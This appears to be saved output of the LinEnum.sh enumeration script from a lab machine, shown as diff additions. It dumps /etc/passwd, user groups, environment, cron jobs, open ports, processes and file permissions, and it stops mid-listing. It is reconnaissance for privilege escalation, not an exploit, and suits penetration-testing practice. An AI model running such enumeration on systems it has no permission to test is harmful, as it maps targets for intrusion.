+uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
+mongodb:x:111:65534::/home/mongodb:/bin/false
+mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 20K
+drwxr-xr-x  5 root root 4.0K Aug 31  2017 .
+drwxr-xr-x 25 root root 4.0K Sep  2  2017 ..
+drwxr-xr-x  2 root root 4.0K Aug 31  2017 frank
+drwxr-xr-x  3 root root 4.0K Sep  3  2017 mark
+drwxr-xr-x  6 root root 4.0K Sep  3  2017 tom
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+XDG_SESSION_ID=1
+TERM=xterm-256color
+SHELL=/bin/bash
+SSH_CLIENT=192.168.0.2 53128 22
+SSH_TTY=/dev/pts/0
+LC_ALL=en_US.UTF-8
+USER=mark
+MAIL=/var/mail/mark
+PATH=/home/mark/bin:/home/mark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+PWD=/tmp
+LANG=en_GB.UTF-8
+SHLVL=3
+HOME=/home/mark
+LANGUAGE=en_GB:en
+LOGNAME=mark
+SSH_CONNECTION=192.168.0.2 53128 192.168.0.14 22
+LC_CTYPE=en_US.UTF-8
+LESSOPEN=| /usr/bin/lesspipe %s
+XDG_RUNTIME_DIR=/run/user/1001
+LESSCLOSE=/usr/bin/lesspipe %s %s
+_=/usr/bin/env
+
+
+[-] Path information:
+/home/mark/bin:/home/mark/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/tmux
+/usr/bin/screen
+
+
+[-] Current umask value:
+0002
+u=rwx,g=rwx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK		022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x  2 root root 4096 Aug 29  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--  1 root root  189 Aug 29  2017 popularity-contest
+
+/etc/cron.daily:
+total 56
+drwxr-xr-x  2 root root 4096 Aug 29  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1474 Jun 19  2017 apt-compat
+-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
+-rwxr-xr-x  1 root root 1597 Nov 26  2015 dpkg
+-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
+-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
+-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
+-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
+-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug 29  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Aug 29  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 Aug 29  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
+-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
+-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
+-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common
+
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+enp0s3    Link encap:Ethernet  HWaddr 08:00:27:a2:8a:95  
+          inet addr:192.168.0.14  Bcast:192.168.0.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fea2:8a95/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:11442 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:9821 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:11003064 (11.0 MB)  TX bytes:15536824 (15.5 MB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:11611 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:11611 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1 
+          RX bytes:1174388 (1.1 MB)  TX bytes:1174388 (1.1 MB)
+
+
+[-] ARP history:
+? (192.168.0.2) at 00:e1:8c:dc:08:bb [ether] on enp0s3
+? (192.168.0.1) at 3c:04:61:e3:10:d1 [ether] on enp0s3
+
+
+[-] Nameserver(s):
+nameserver 68.105.28.11
+nameserver 68.105.29.11
+nameserver 68.105.28.12
+
+
+[-] Default route:
+default         192.168.0.1     0.0.0.0         UG    0      0        0 enp0s3
+
+
+[-] Listening TCP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:37696         127.0.0.1:27017         ESTABLISHED -               
+tcp        0      0 127.0.0.1:37698         127.0.0.1:27017         ESTABLISHED -               
+tcp        0      0 192.168.0.14:22         192.168.0.2:53256       ESTABLISHED -               
+tcp        0      0 127.0.0.1:27017         127.0.0.1:37694         ESTABLISHED -               
+tcp        0      0 192.168.0.14:22         192.168.0.2:53128       ESTABLISHED -               
+tcp        0      0 127.0.0.1:37694         127.0.0.1:27017         ESTABLISHED -               
+tcp        0      0 127.0.0.1:27017         127.0.0.1:37698         ESTABLISHED -               
+tcp        0      0 127.0.0.1:27017         127.0.0.1:37696         ESTABLISHED -               
+tcp6       0      0 :::3000                 :::*                    LISTEN      -               
+
+
+[-] Listening UDP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.5  38020  6052 ?        Ss   02:43   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    02:43   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S    02:43   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   02:43   0:00 [kworker/0:0H]
+root         7  0.0  0.0      0     0 ?        S    02:43   0:00 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    02:43   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    02:43   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S    02:43   0:00 [watchdog/0]
+root        11  0.0  0.0      0     0 ?        S    02:43   0:00 [kdevtmpfs]
+root        12  0.0  0.0      0     0 ?        S<   02:43   0:00 [netns]
+root        13  0.0  0.0      0     0 ?        S<   02:43   0:00 [perf]
+root        14  0.0  0.0      0     0 ?        S    02:43   0:00 [khungtaskd]
+root        15  0.0  0.0      0     0 ?        S<   02:43   0:00 [writeback]
+root        16  0.0  0.0      0     0 ?        SN   02:43   0:00 [ksmd]
+root        17  0.0  0.0      0     0 ?        SN   02:43   0:00 [khugepaged]
+root        18  0.0  0.0      0     0 ?        S<   02:43   0:00 [crypto]
+root        19  0.0  0.0      0     0 ?        S<   02:43   0:00 [kintegrityd]
+root        20  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        21  0.0  0.0      0     0 ?        S<   02:43   0:00 [kblockd]
+root        22  0.0  0.0      0     0 ?        S<   02:43   0:00 [ata_sff]
+root        23  0.0  0.0      0     0 ?        S<   02:43   0:00 [md]
+root        24  0.0  0.0      0     0 ?        S<   02:43   0:00 [devfreq_wq]
+root        28  0.0  0.0      0     0 ?        S    02:43   0:00 [kswapd0]
+root        29  0.0  0.0      0     0 ?        S<   02:43   0:00 [vmstat]
+root        30  0.0  0.0      0     0 ?        S    02:43   0:00 [fsnotify_mark]
+root        31  0.0  0.0      0     0 ?        S    02:43   0:00 [ecryptfs-kthrea]
+root        47  0.0  0.0      0     0 ?        S<   02:43   0:00 [kthrotld]
+root        48  0.0  0.0      0     0 ?        S<   02:43   0:00 [acpi_thermal_pm]
+root        49  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        50  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        51  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        52  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        53  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        54  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        55  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        56  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root        57  0.0  0.0      0     0 ?        S    02:43   0:00 [scsi_eh_0]
+root        58  0.0  0.0      0     0 ?        S<   02:43   0:00 [scsi_tmf_0]
+root        59  0.0  0.0      0     0 ?        S    02:43   0:00 [scsi_eh_1]
+root        60  0.0  0.0      0     0 ?        S<   02:43   0:00 [scsi_tmf_1]
+root        66  0.0  0.0      0     0 ?        S<   02:43   0:00 [ipv6_addrconf]
+root        79  0.0  0.0      0     0 ?        S<   02:43   0:00 [deferwq]
+root        80  0.0  0.0      0     0 ?        S<   02:43   0:00 [charger_manager]
+root        81  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root       127  0.0  0.0      0     0 ?        S<   02:43   0:00 [kpsmoused]
+root       143  0.0  0.0      0     0 ?        S<   02:43   0:00 [kworker/0:1H]
+root       162  0.0  0.0      0     0 ?        S    02:43   0:00 [scsi_eh_2]
+root       163  0.0  0.0      0     0 ?        S<   02:43   0:00 [scsi_tmf_2]
+root       164  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root       239  0.0  0.0      0     0 ?        S<   02:43   0:00 [raid5wq]
+root       264  0.0  0.0      0     0 ?        S<   02:43   0:00 [kdmflush]
+root       265  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root       275  0.0  0.0      0     0 ?        S<   02:43   0:00 [kdmflush]
+root       276  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root       287  0.0  0.0      0     0 ?        S<   02:43   0:00 [bioset]
+root       320  0.0  0.0      0     0 ?        S    02:43   0:00 [jbd2/dm-0-8]
+root       321  0.0  0.0      0     0 ?        S<   02:43   0:00 [ext4-rsv-conver]
+root       368  0.0  0.0      0     0 ?        S    02:43   0:02 [kworker/0:4]
+root       385  0.0  0.2  28356  2896 ?        Ss   02:43   0:00 /lib/systemd/systemd-journald
+root       391  0.0  0.0      0     0 ?        S    02:43   0:00 [kauditd]
+root       401  0.0  0.0      0     0 ?        S<   02:43   0:00 [iscsi_eh]
+root       416  0.0  0.1 102968  1620 ?        Ss   02:43   0:00 /sbin/lvmetad -f
+root       417  0.0  0.0      0     0 ?        S<   02:43   0:00 [ib_addr]
+root       428  0.0  0.4  44772  4296 ?        Ss   02:43   0:00 /lib/systemd/systemd-udevd
+root       432  0.0  0.0      0     0 ?        S<   02:43   0:00 [ib_mcast]
+root       434  0.0  0.0      0     0 ?        S<   02:43   0:00 [ib_nl_sa_wq]
+root       437  0.0  0.0      0     0 ?        S<   02:43   0:00 [ib_cm]
+root       441  0.0  0.0      0     0 ?        S<   02:43   0:00 [iw_cm_wq]
+root       445  0.0  0.0      0     0 ?        S<   02:43   0:00 [rdma_cm]
+root       612  0.0  0.0      0     0 ?        S<   02:43   0:00 [iprt-VBoxWQueue]
+root       784  0.0  0.0      0     0 ?        S<   02:43   0:00 [ext4-rsv-conver]
+systemd+   812  0.0  0.2 100324  2480 ?        Ssl  02:43   0:00 /lib/systemd/systemd-timesyncd
+root       903  0.0  0.0      0     0 ?        S<   02:43   0:00 [ttm_swap]
+root       929  0.0  0.3 621752  3796 ?        Ssl  02:43   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
+root       933  0.0  0.6 275892  6304 ?        Ssl  02:43   0:00 /usr/lib/accountsservice/accounts-daemon
+message+   937  0.0  0.3  42904  3808 ?        Ss   02:43   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       966  0.0  0.3  29008  3052 ?        Ss   02:43   0:00 /usr/sbin/cron -f
+root       968  0.0  2.3 344232 23588 ?        S<sl 02:43   0:00 /usr/lib/snapd/snapd
+root       978  0.0  0.2  28548  2908 ?        Ss   02:43   0:00 /lib/systemd/systemd-logind
+daemon     983  0.0  0.2  26044  2148 ?        Ss   02:43   0:00 /usr/sbin/atd -f
+syslog     989  0.0  0.3 256400  3372 ?        Ssl  02:43   0:00 /usr/sbin/rsyslogd -n
+root       993  0.0  0.1   4400  1280 ?        Ss   02:43   0:00 /usr/sbin/acpid
+root      1024  0.0  0.5 277180  5880 ?        Ssl  02:43   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root      1035  0.0  0.0  13376   168 ?        Ss   02:43   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
+root      1063  0.0  0.2  16120  2896 ?        Ss   02:43   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
+tom       1177  0.0  5.3 1027560 54076 ?       Ssl  02:43   0:02 /usr/bin/node /var/www/myplace/app.js
+root      1180  0.0  0.6  65520  6212 ?        Ss   02:43   0:00 /usr/sbin/sshd -D
+mongodb   1181  1.2  8.9 282980 90624 ?        Ssl  02:43   1:05 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
+tom       1182  0.0  4.2 1009080 43024 ?       Ssl  02:43   0:02 /usr/bin/node /var/scheduler/app.js
+root      1202  0.0  0.0   5224   164 ?        Ss   02:43   0:00 /sbin/iscsid
+root      1203  0.0  0.3   5724  3524 ?        S<Ls 02:43   0:01 /sbin/iscsid
+root      1263  0.0  0.1  15940  1836 tty1     Ss+  02:43   0:00 /sbin/agetty --noclear tty1 linux
+root      1340  0.0  0.6  95484  6976 ?        Ss   03:16   0:00 sshd: mark [priv]
+mark      1342  0.0  0.4  45248  4480 ?        Ss   03:16   0:00 /lib/systemd/systemd --user
+mark      1345  0.0  0.2  61472  2120 ?        S    03:16   0:00 (sd-pam)
+mark      1352  0.0  0.5  96504  5176 ?        S    03:16   0:00 sshd: mark@pts/0
+mark      1353  0.0  0.5  22600  5348 pts/0    Ss   03:16   0:00 -bash
+root      2169  0.0  0.0      0     0 ?        S    03:52   0:00 [kworker/u2:0]
+root      2172  0.0  0.6  95404  6884 ?        Ss   03:57   0:00 sshd: mark [priv]
+root      2175  0.0  0.0      0     0 ?        S    03:57   0:00 [kworker/0:1]
+mark      2178  0.0  0.3  95404  3144 ?        S    03:57   0:00 sshd: mark@pts/1
+mark      2180  0.0  0.5  22600  5264 pts/1    Ss+  03:57   0:00 -bash
+root      2194  0.0  0.0      0     0 ?        S    04:01   0:00 [kworker/u2:1]
+root      2249  0.0  0.0      0     0 ?        S    04:09   0:00 [kworker/u2:2]
+root      2250  0.0  0.2  20220  2432 pts/0    S    04:09   0:00 newgrp
+mark      2251  0.0  0.5  22560  5236 pts/0    S    04:09   0:00 bash
+mark      2274  0.1  0.3  13524  4004 pts/0    S+   04:10   0:00 bash LinEnum.sh
+mark      2275  0.1  0.3  13572  3500 pts/0    S+   04:10   0:00 bash LinEnum.sh
+mark      2276  0.0  0.0   7316   676 pts/0    S+   04:10   0:00 tee -a
+mark      2459  0.0  0.2  13556  2864 pts/0    S+   04:11   0:00 bash LinEnum.sh
+mark      2460  0.0  0.3  37372  3300 pts/0    R+   04:11   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+1.6M -rwxr-xr-x 1 root root 1.6M Jul 19  2017 /lib/systemd/systemd
+320K -rwxr-xr-x 1 root root 319K Jul 19  2017 /lib/systemd/systemd-journald
+608K -rwxr-xr-x 1 root root 605K Jul 19  2017 /lib/systemd/systemd-logind
+140K -rwxr-xr-x 1 root root 139K Jul 19  2017 /lib/systemd/systemd-timesyncd
+444K -rwxr-xr-x 1 root root 443K Jul 19  2017 /lib/systemd/systemd-udevd
+ 44K -rwxr-xr-x 1 root root  44K Jun 14  2017 /sbin/agetty
+476K -rwxr-xr-x 1 root root 476K May 25  2017 /sbin/dhclient
+   0 lrwxrwxrwx 1 root root   20 Aug 29  2017 /sbin/init -> /lib/systemd/systemd
+768K -rwxr-xr-x 1 root root 766K Jul 26  2017 /sbin/iscsid
+ 52K -rwxr-xr-x 1 root root  51K Apr 16  2016 /sbin/lvmetad
+504K -rwxr-xr-x 1 root root 502K Feb 20  2017 /sbin/mdadm
+220K -rwxr-xr-x 1 root root 219K Jan 12  2017 /usr/bin/dbus-daemon
+ 20K -rwxr-xr-x 1 root root  19K Jul  5  2017 /usr/bin/lxcfs
+ 37M -rwxr-xr-x 1 root root  37M Jul 27  2017 /usr/bin/mongod
+   0 lrwxrwxrwx 1 root root   22 Aug 30  2017 /usr/bin/node -> /etc/alternatives/node
+164K -rwxr-xr-x 1 root root 162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
+ 16K -rwxr-xr-x 1 root root  15K Jan 17  2016 /usr/lib/policykit-1/polkitd
+ 19M -rwxr-xr-x 1 root root  19M Jul 17  2017 /usr/lib/snapd/snapd
+ 48K -rwxr-xr-x 1 root root  47K Apr  8  2016 /usr/sbin/acpid
+ 28K -rwxr-xr-x 1 root root  27K Jan 14  2016 /usr/sbin/atd
+ 44K -rwxr-xr-x 1 root root  44K Apr  5  2016 /usr/sbin/cron
+588K -rwxr-xr-x 1 root root 586K Apr  5  2016 /usr/sbin/rsyslogd
+784K -rwxr-xr-x 1 root root 781K Mar 16  2017 /usr/sbin/sshd
+
+
+[-] /etc/init.d/ binary permissions:
+total 304
+drwxr-xr-x  2 root root 4096 Aug 30  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
+-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
+-rwxr-xr-x  1 root root 2799 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
+-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
+-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
+-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
+-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
+-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
+-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
+-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
+-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
+-rwxr-xr-x  1 root root 2813 Dec  2  2015 dbus
+-rw-r--r--  1 root root 1264 Aug 30  2017 .depend.boot
+-rw-r--r--  1 root root  955 Aug 30  2017 .depend.start
+-rw-r--r--  1 root root 1019 Aug 30  2017 .depend.stop
+-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
+-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
+-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
+-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
+-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
+-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
+-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
+-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
+-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
+-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
+-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
+-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
+-rwxr-xr-x  1 root root 2300 Jul  5  2017 lxcfs
+-rwxr-xr-x  1 root root 2541 Jun  8  2017 lxd
+-rwxr-xr-x  1 root root 2611 Apr 11  2016 mdadm
+-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
+-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
+-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
+-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
+-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
+-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
+-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
+-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
+-rwxr-xr-x  1 root root 1581 Oct 16  2015 ondemand
+-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
+-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
+-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
+-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
+-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
+-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
+-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
+-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
+-rw-r--r--  1 root root 2427 Jan 19  2016 README
+-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
+-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
+-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
+-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
+-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
+-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
+-rwxr-xr-x  1 root root  597 Jan 19  2016 single
+-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
+-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
+-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
+-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
+-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
+-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
+-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
+-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
+-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
+-rwxr-xr-x  1 root root 1306 Jun 14  2017 uuidd
+
+
+[-] /etc/init/ config file permissions:
+total 152
+drwxr-xr-x  2 root root 4096 Aug 30  2017 .
+drwxr-xr-x 92 root root 4096 Sep  3  2017 ..
+-rw-r--r--  1 root root  338 Apr  8  2016 acpid.conf
+-rw-r--r--  1 root root 3709 Mar  3  2017 apparmor.conf
+-rw-r--r--  1 root root 1626 Jul 17  2017 apport.conf
+-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
+-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
+-rw-r--r--  1 root root  297 Apr  5  2016 cron.conf
+-rw-r--r--  1 root root 1519 Mar 28  2015 cryptdisks.conf
+-rw-r--r--  1 root root  412 Mar 28  2015 cryptdisks-udev.conf
+-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
+-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
+-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
+-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
+-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
+-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
+-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
+-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
+-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
+-rw-r--r--  1 root root  540 Jul  5  2017 lxcfs.conf
+-rw-r--r--  1 root root  813 Jun  8  2017 lxd.conf
+-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
+-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
+-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
+-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
+-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
+-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
+-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
+-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
+-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
+-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
+-rw-r--r--  1 root root  641 Mar 16  2017 ssh.conf
+-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
+-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
+-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
+-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
+-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf
+-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 8.3M
+drwxr-xr-x 26 root root  20K Aug 30  2017 system
+drwxr-xr-x  2 root root 4.0K Aug 29  2017 system-sleep
+drwxr-xr-x  2 root root 4.0K Aug 29  2017 system-generators
+drwxr-xr-x  2 root root 4.0K Aug 29  2017 system-preset
+drwxr-xr-x  2 root root 4.0K Aug 29  2017 network
